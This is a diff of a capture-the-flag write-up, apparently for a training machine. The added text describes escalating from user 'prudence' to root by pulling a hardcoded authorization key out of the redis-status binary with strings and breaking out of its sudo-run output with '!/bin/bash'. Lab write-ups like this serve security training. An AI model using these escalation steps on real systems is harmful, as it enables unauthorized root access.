@@ -90,7 +90,38 @@ On a separate Linux shell we set up a remote listener to catch the server redire
 With success, we get a connection to our listener on port 80 and are logged in as the user, "prudence"
 # Privilege Escalation
 
-Auth Key found in the /usr/...redis-status file:
+As prudence we run through common privilege escalation locations and hit a suspicious value when checking prudence's sudo privileges. 
 
-ClimbingParrotKickingDonkey321
-ls
+The "prudence" user is able to run the command *redis-status* with sudo. 
+
+	sudo /usr/bin/local/redis-status
+
+On our first attempt, we run the command and are prompted for any Authorization key. Since we do not have this, we search around the machine for the key. 
+
+When searching the command location using the *strings* command, we find an Authorization key that is available for use:
+
+	strings /usr/local/bin/redis-status
+
+Output:
+
+...
+*] Redis Uptime
+Authorization Key: 
+==ClimbingParrotKickingDonkey321==
+/usr/bin/systemctl status redis
+Wrong Authorization Key!
+Incident has been reported!
+...
+
+
+With the authorization key, we try running the sudo redis-status command again 
+
+	sudo /usr/bin/local/redis-status
+	Authorization Key: ClimbingParrotKickingDonkey321
+
+
+As the command output runs we notice that the output does not come to a compelte finish and allows us to input more commands. Since the commands appear to be running as root, we attempt to open a bash shell with 
+
+	!/bin/bash
+
+Success! A new prompt has opened up as the root user. The root flag can be found in home directory, the machine is now solved.
